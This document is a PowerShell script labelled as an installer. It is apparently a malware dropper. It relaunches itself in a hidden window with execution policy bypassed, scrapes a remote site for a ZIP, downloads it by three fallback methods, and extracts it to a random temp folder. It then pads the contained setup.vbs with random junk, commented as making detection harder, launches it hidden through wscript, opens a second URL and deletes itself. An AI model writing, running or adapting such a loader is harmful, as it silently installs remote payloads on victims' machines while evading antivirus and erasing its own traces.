# 

# ============================================================
# FIXED INSTALLER - NO ERRORS
# ============================================================

# Force bypass of execution policy for this session
$ErrorActionPreference = "Continue"

# ============================================================
# HIDE WINDOW (optional)
# ============================================================
$ShowWindow = $1

if (-not $ShowWindow) {
    if ($env:__PS_HIDDEN_LAUNCH -ne "1") {
        $scriptPath = $MyInvocation.MyCommand.Path
        $env:__PS_HIDDEN_LAUNCH = "1"
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        exit
    }
}

# ============================================================
# LOGGING
# ============================================================
$logPath = Join-Path $env:TEMP "ps1_installer.log"
function Write-Log {
    param($msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logPath -Value "$timestamp - $msg"
}
Write-Log "========================================="
Write-Log "INSTALLER STARTED"
Write-Log "========================================="

# ============================================================
# FUNCTIONS
# ============================================================

function Get-RandomString {
    param($length)
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Get-ZipUrlFromPage {
    param($pageUrl)
    Write-Log "Scraping page for ZIP: $pageUrl"
    try {
        $resp = Invoke-WebRequest -Uri $pageUrl -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction Stop
        $html = $resp.Content
        
        # Try href="...zip"
        $pattern = 'href=["'']([^"'' ]*\.zip)["'']'
        $matches = [regex]::Matches($html, $pattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($matches.Count -gt 0) {
            $zipRef = $matches[0].Groups[1].Value
            if ($zipRef -notmatch '^http') {
                $zipRef = [System.Uri]::new($pageUrl, $zipRef).AbsoluteUri
            }
            Write-Log "Found ZIP in href: $zipRef"
            return $zipRef
        }
        
        # Try plain text .zip
        $pattern2 = '([^\s"'' ]+\.zip)'
        $matches2 = [regex]::Matches($html, $pattern2, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($matches2.Count -gt 0) {
            $zipRef = $matches2[0].Groups[1].Value
            if ($zipRef -notmatch '^http') {
                $zipRef = [System.Uri]::new($pageUrl, $zipRef).AbsoluteUri
            }
            Write-Log "Found ZIP in text: $zipRef"
            return $zipRef
        }
    } catch {
        Write-Log "Scraping error: $_"
    }
    return $null
}

function Download-File {
    param($url, $destPath)
    
    Write-Log "Downloading: $url"
    
    # Add cache buster
    $ts = "?t=" + [int]((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalMilliseconds)
    $fullUrl = $url + $ts
    
    # Method 1: Invoke-WebRequest
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $fullUrl -OutFile $destPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction Stop
        Write-Log "Download OK (WebRequest)"
        return $true
    } catch {
        Write-Log "WebRequest failed: $_"
    }
    
    # Method 2: WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($fullUrl, $destPath)
        Write-Log "Download OK (WebClient)"
        return $true
    } catch {
        Write-Log "WebClient failed: $_"
    }
    
    # Method 3: BITS Transfer
    try {
        Start-BitsTransfer -Source $fullUrl -Destination $destPath -Priority Low -ErrorAction Stop
        Write-Log "Download OK (BITS)"
        return $true
    } catch {
        Write-Log "BITS failed: $_"
    }
    
    Write-Log "ALL download methods failed"
    return $false
}

function Find-SetupVBS {
    param($folder)
    Get-ChildItem -Path $folder -Recurse -Filter "setup.vbs" -ErrorAction SilentlyContinue |
        Select-Object -First 1 -ExpandProperty FullName
}

# ============================================================
# MAIN CODE
# ============================================================

$inputUrl = "http://mayfiles.vip/getinlink/"
$autoDetect = $1
$openUrlAfter = $0
$urlAfter = "https://cloudnesto.com/SoftwareEXE"

Write-Log "Input URL: $inputUrl"
Write-Log "Auto Detect: $autoDetect"

# Get actual download URL
$downloadUrl = $inputUrl

if ($autoDetect -eq "1" -and ($inputUrl -notmatch '\.zip$')) {
    Write-Log "Auto-detecting ZIP link..."
    $detected = Get-ZipUrlFromPage -pageUrl $inputUrl
    if ($detected) {
        $downloadUrl = $detected
        Write-Log "Detected URL: $downloadUrl"
    } else {
        Write-Log "Auto-detect failed, using original URL"
    }
}

Write-Log "Final download URL: $downloadUrl"

# Setup paths
$tempDir = [System.IO.Path]::GetTempPath()
$randName = Get-RandomString -length 12
$zipPath = Join-Path $tempDir "download_$randName.zip"
$extractDir = Join-Path $tempDir "setup_$randName"

# Download
$downloadSuccess = Download-File -url $downloadUrl -destPath $zipPath

if (-not $downloadSuccess) {
    Write-Log "DOWNLOAD FAILED"
    exit 1
}

# Check file size
if ((Get-Item $zipPath).Length -lt 1000) {
    Write-Log "ZIP too small (<1KB), deleting"
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    exit 1
}

Write-Log "Downloaded: $(Get-Item $zipPath).Length bytes"

# Extract
try {
    Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force -ErrorAction Stop
    Write-Log "Extraction successful"
} catch {
    Write-Log "Extraction failed: $_"
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    exit 1
}

# Find setup.vbs
$vbsPath = Find-SetupVBS -folder $extractDir

if ($vbsPath) {
    Write-Log "Found setup.vbs: $vbsPath"
    
    # Add junk to VBS (makes it harder to detect)
    $junkSize = Get-Random -Minimum 102400 -Maximum 716800
    $junk = Get-RandomString -length $junkSize
    Add-Content -Path $vbsPath -Value ("'" + $junk)
    Write-Log "Added junk to VBS ($junkSize bytes)"
    
    # Launch VBS
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    Write-Log "VBS launched"
} else {
    Write-Log "setup.vbs NOT found in extracted folder"
}

# Cleanup ZIP
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# Open URL after VBS
if ($openUrlAfter -eq "1" -and $urlAfter) {
    Write-Log "Opening URL: $urlAfter"
    Start-Process $urlAfter
}

# Self-destruct
$selfPath = $MyInvocation.MyCommand.Path
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 2; Remove-Item -Path '$selfPath' -Force`"" -WindowStyle Hidden

Write-Log "========================================="
Write-Log "INSTALLER COMPLETED"
Write-Log "========================================="
